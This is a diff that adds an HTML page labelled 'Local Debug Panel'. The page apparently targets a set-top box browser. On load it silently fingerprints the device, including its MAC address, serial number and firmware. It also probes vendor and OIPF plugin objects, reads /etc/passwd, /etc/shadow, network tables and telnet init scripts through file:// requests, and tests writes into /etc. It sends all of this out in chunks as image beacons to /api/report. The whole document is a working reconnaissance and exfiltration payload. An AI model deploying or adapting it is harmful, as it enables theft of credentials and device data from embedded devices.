@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Local Debug Panel</title>
+<style type="text/css">
+html,body { margin:0; padding:0; width:1280px; height:720px; overflow:hidden; background:#101010; color:#eee; font-family:Arial,Helvetica,sans-serif; font-size:12px; }
+#wrap { padding:8px 10px; }
+h1 { font-size:17px; margin:0 0 3px 0; color:#7CFC00; }
+#status { color:#7CFC00; font-size:12px; }
+#token { color:#888; font-size:10px; }
+.cols { width:1260px; margin-top:6px; }
+.col { float:left; width:410px; margin-right:10px; }
+.col.last { margin-right:0; }
+h2 { font-size:12px; margin:0 0 3px 0; color:#7CFC00; border-bottom:1px solid #333; padding-bottom:2px; }
+.box { height:575px; overflow:hidden; background:#000; border:1px solid #333; padding:4px; }
+.row { border-bottom:1px solid #1c1c1c; padding:1px 0; line-height:1.25; }
+.k { color:#9ad; }
+.v { color:#eee; word-wrap:break-word; }
+.ok { color:#7CFC00; }
+.err { color:#ff6b6b; }
+#foot { clear:both; color:#777; font-size:10px; margin-top:4px; }
+</style>
+</head>
+<body>
+<div id="wrap">
+<h1>LOCAL DEBUG PANEL <span id="status">collecting...</span></h1>
+<div id="token">token ...</div>
+<div class="cols">
+  <div class="col"><h2>SYSTEM PLUGIN (valups/system)</h2><div class="box" id="sysbox"></div></div>
+  <div class="col"><h2>BROWSER / PLUGINS</h2><div class="box" id="browserbox"></div></div>
+  <div class="col last"><h2>OIPF / FILES</h2><div class="box" id="oipfbox"></div></div>
+</div>
+<div id="foot">Data is sent automatically as image beacons. No scrolling needed.</div>
+</div>
+<object type="valups/system" id="system" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object id="appmgr" type="application/oipfApplicationManager" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object id="oipfcfg" type="application/oipfConfiguration" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object id="oipfObjectFactory" type="application/oipfObjectFactory" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<script type="text/javascript">
+var token = String(new Date().getTime()) + "-" + String(Math.floor(Math.random() * 1000000));
+var sent = 0;
+var sysTries = 0;
+
+function esc(s) {
+    if (s === null || s === undefined) return "";
+    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+function setStatus(t, cls) {
+    var e = document.getElementById("status");
+    if (e) { e.innerHTML = t; e.className = cls || "ok"; }
+}
+function addRow(boxId, k, v) {
+    var b = document.getElementById(boxId);
+    if (!b) return;
+    b.innerHTML += '<div class="row"><span class="k">' + esc(k) + ':</span> <span class="v">' + esc(v) + '</span></div>';
+}
+function send(k, v) {
+    try {
+        var im = new Image();
+        im.src = "/api/report?token=" + encodeURIComponent(token) +
+                 "&k=" + encodeURIComponent(k) +
+                 "&v=" + encodeURIComponent(String(v).substring(0, 340)) +
+                 "&n=" + (sent++) + "&r=" + Math.random();
+    } catch (e) {}
+}
+function sendLong(k, v) {
+    v = String(v);
+    var i;
+    for (i = 0; i < v.length && i < 2800; i += 340) {
+        send(k + "." + i, v.substring(i, i + 340));
+    }
+}
+function enumObj(o, prefix, boxId, max) {
+    var c = 0, k, v;
+    try {
+        for (k in o) {
+            if (c++ > (max || 25)) break;
+            try { v = o[k]; } catch (e) { v = "ERR"; }
+            if (typeof v != "function") {
+                addRow(boxId, prefix + "." + k, v);
+                send(prefix + "." + k, v);
+            }
+        }
+    } catch (e) { send(prefix + ".enum.err", e.message || e); }
+}
+
+function probeSystem() {
+    var s = document.getElementById("system");
+    if (!s) {
+        if (sysTries++ < 5) { setTimeout(probeSystem, 800); return; }
+        addRow("sysbox", "system", "NOT FOUND");
+        send("sys.exists", "no");
+        return;
+    }
+    send("sys.exists", "yes");
+    addRow("sysbox", "object", "found");
+    var names = ["deviceID", "deviceId", "macAddress", "modelName", "modelVariant",
+                 "serialNumber", "softwareVersion", "screenLanguage", "systemId",
+                 "model", "modelId", "vendor", "version", "firmwareVersion",
+                 "swVersion", "serial", "mac", "manufacturer", "product"];
+    var i, n, v;
+    for (i = 0; i < names.length; i++) {
+        n = names[i];
+        try { v = s[n]; } catch (e) { v = "ERR:" + (e.message || e); }
+        if (v !== undefined && v !== null && typeof v != "function") {
+            addRow("sysbox", n, v);
+            send("sys." + n, v);
+        }
+    }
+    enumObj(s, "sys", "sysbox", 40);
+    try {
+        if (typeof s.getSystemInfo == "function") {
+            var info = s.getSystemInfo();
+            addRow("sysbox", "getSystemInfo()", "ok");
+            enumObj(info, "info", "sysbox", 40);
+        }
+    } catch (e) { send("sys.getSystemInfo.err", e.message || e); }
+}
+
+function probeBrowser() {
+    addRow("browserbox", "ua", navigator.userAgent);
+    addRow("browserbox", "platform", navigator.platform);
+    addRow("browserbox", "screen", screen.width + "x" + screen.height + "x" + screen.colorDepth);
+    addRow("browserbox", "inner", (window.innerWidth || 0) + "x" + (window.innerHeight || 0));
+    addRow("browserbox", "tz", new Date().getTimezoneOffset());
+    addRow("browserbox", "cookie", navigator.cookieEnabled);
+    addRow("browserbox", "json", (typeof JSON != "undefined") ? "yes" : "no");
+    addRow("browserbox", "xhr", (typeof XMLHttpRequest != "undefined") ? "yes" : "no");
+    send("browser.ua", navigator.userAgent);
+    send("browser.platform", navigator.platform);
+    send("browser.screen", screen.width + "x" + screen.height + "x" + screen.colorDepth);
+    send("browser.inner", (window.innerWidth || 0) + "x" + (window.innerHeight || 0));
+    send("browser.tz", new Date().getTimezoneOffset());
+    send("browser.json", (typeof JSON != "undefined") ? "yes" : "no");
+    send("browser.xhr", (typeof XMLHttpRequest != "undefined") ? "yes" : "no");
+    var i, p, k, c;
+    if (navigator.plugins) {
+        for (i = 0; i < navigator.plugins.length && i < 30; i++) {
+            p = navigator.plugins[i];
+            addRow("browserbox", "plugin" + i, p.name);
+            send("plugin." + i, p.name + " | " + p.description + " | " + p.filename + " | " + p.length);
+            c = 0;
+            try {
+                for (k in p) {
+                    if (c++ > 15) break;
+                    try { send("plugin." + i + "." + k, typeof p[k] + ":" + String(p[k]).substring(0, 100)); } catch (e) {}
+                }
+            } catch (e) {}
+        }
+    }
+}
+
+function probeOipf() {
+    var ids = ["oipfObjectFactory", "oipfcfg", "appmgr"];
+    var i, el;
+    for (i = 0; i < ids.length; i++) {
+        el = document.getElementById(ids[i]);
+        addRow("oipfbox", "el." + ids[i], el ? "yes" : "no");
+        send("el." + ids[i], el ? "yes" : "no");
+    }
+    var f = document.getElementById("oipfObjectFactory");
+    if (!f) { try { f = window.oipfObjectFactory; } catch (e) {} }
+    addRow("oipfbox", "factory", f ? "yes" : "no");
+    send("factory", f ? "yes" : "no");
+    if (!f) return;
+    var methods = ["createApplicationManagerObject", "createConfigurationObject",
+                   "createCapabilitiesObject", "createVideoBroadcastObject",
+                   "createAudioBroadcastObject", "createDRMAgentObject",
+                   "createParentalControlObject", "createRecordingSchedulerObject",
+                   "createMediaPlayerObject", "createAVControlObject",
+                   "createDownloadManagerObject", "createInternetAccessObject"];
+    var m, o;
+    for (i = 0; i < methods.length; i++) {
+        m = methods[i];
+        try {
+            o = f[m]();
+            addRow("oipfbox", m, o ? "ok" : "null");
+            send("oipf." + m, o ? "ok" : "null");
+            if (o) enumObj(o, "oipf." + m, "oipfbox", 12);
+        } catch (e) {
+            addRow("oipfbox", m, "ERR");
+            send("oipf." + m + ".err", e.message || e);
+        }
+    }
+}
+
+function probeFile(path) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open("GET", "file://" + path, true);
+        x.onreadystatechange = function () {
+            if (x.readyState == 4) {
+                var t = "";
+                try { t = x.responseText || ""; } catch (e) {}
+                addRow("oipfbox", "file " + path, "status=" + x.status + " len=" + t.length);
+                send("file." + path + ".status", x.status + " len=" + t.length);
+                if (t) sendLong("file." + path + ".data", t);
+            }
+        };
+        x.send(null);
+    } catch (e) {
+        addRow("oipfbox", "file " + path, "ERR");
+        send("file." + path + ".err", e.message || e);
+    }
+}
+
+function probeWrite() {
+    var paths = ["/tmp/hx_test", "/etc/hx_test", "/home/settop/hx_test"];
+    var i;
+    for (i = 0; i < paths.length; i++) {
+        (function (path) {
+            var x;
+            try {
+                x = new XMLHttpRequest();
+                x.open("PUT", "file://" + path, true);
+                x.onreadystatechange = function () {
+                    if (x.readyState == 4) {
+                        addRow("oipfbox", "PUT " + path, "status=" + x.status);
+                        send("write." + path + ".put", x.status);
+                        var y = new XMLHttpRequest();
+                        y.open("GET", "file://" + path, true);
+                        y.onreadystatechange = function () {
+                            if (y.readyState == 4) {
+                                var t = "";
+                                try { t = y.responseText || ""; } catch (e) {}
+                                send("write." + path + ".get",
+                                     y.status + " len=" + t.length + " data=" + t.substring(0, 120));
+                            }
+                        };
+                        y.send(null);
+                    }
+                };
+                x.send("HXWRITE");
+            } catch (e) {
+                send("write." + path + ".put.err", e.message || e);
+            }
+        })(paths[i]);
+    }
+    try {
+        var p = new XMLHttpRequest();
+        p.open("POST", "file:///tmp/hx_post", true);
+        p.onreadystatechange = function () {
+            if (p.readyState == 4) send("write.post", p.status);
+        };
+        p.send("HXPOST");
+    } catch (e2) { send("write.post.err", e2.message || e2); }
+}
+
+function probeMime() {
+    var i, m, pn;
+    if (!navigator.mimeTypes) return;
+    for (i = 0; i < navigator.mimeTypes.length && i < 50; i++) {
+        m = navigator.mimeTypes[i];
+        pn = "";
+        try { pn = m.enabledPlugin ? m.enabledPlugin.name : ""; } catch (e) {}
+        addRow("oipfbox", "mime" + i, m.type + " | " + pn);
+        send("mime." + i, m.type + " | " + pn);
+    }
+}
+
+function probePluginObjects() {
+    var types = ["valups/upgrade", "application/x-valups-upgrade",
+                 "application/upgrade", "application/x-humax-upgrade",
+                 "valups/maxdome", "application/x-valups-maxdome",
+                 "valups/mediainfo", "application/x-valups-mediainfo"];
+    var i;
+    for (i = 0; i < types.length; i++) {
+        (function (type, idx) {
+            var o = document.createElement("object");
+            o.type = type;
+            o.id = "probeobj" + idx;
+            o.width = "0";
+            o.height = "0";
+            o.style.position = "absolute";
+            o.style.left = "0";
+            o.style.top = "0";
+            document.body.appendChild(o);
+            setTimeout(function () {
+                var ok = "no";
+                try { ok = (o && typeof o === "object") ? "yes" : "no"; } catch (e) {}
+                addRow("oipfbox", "obj " + type, ok);
+                send("obj." + type + ".exists", ok);
+                enumObj(o, "obj." + type, "oipfbox", 15);
+            }, 700);
+        })(types[i], i);
+    }
+}
+
+function init() {
+    document.getElementById("token").innerHTML = "token " + esc(token);
+    setStatus("collecting...", "ok");
+    probeSystem();
+    probeBrowser();
+    probeOipf();
+    probeMime();
+    probePluginObjects();
+    probeWrite();
+    var paths = ["/etc/passwd", "/etc/shadow", "/proc/version", "/proc/cpuinfo",
+                 "/proc/mtd", "/etc/init.d/rcS", "/etc/inittab", "/proc/self/cmdline",
+                 "/etc/init.d/", "/etc/", "/etc/default/rcS", "/etc/profile",
+                 "/etc/fstab", "/etc/hosts", "/etc/resolv.conf",
+                 "/proc/net/tcp", "/proc/net/udp", "/etc/rc.local",
+                 "/etc/init.d/S40network", "/etc/init.d/S50telnet",
+                 "/etc/init.d/S99telnetd"];
+    var i;
+    for (i = 0; i < paths.length; i++) probeFile(paths[i]);
+    setTimeout(function () { setStatus("sent " + sent + " beacons", "ok"); }, 3000);
+}
+window.onload = init;
+</script>
+</body>
+</html>
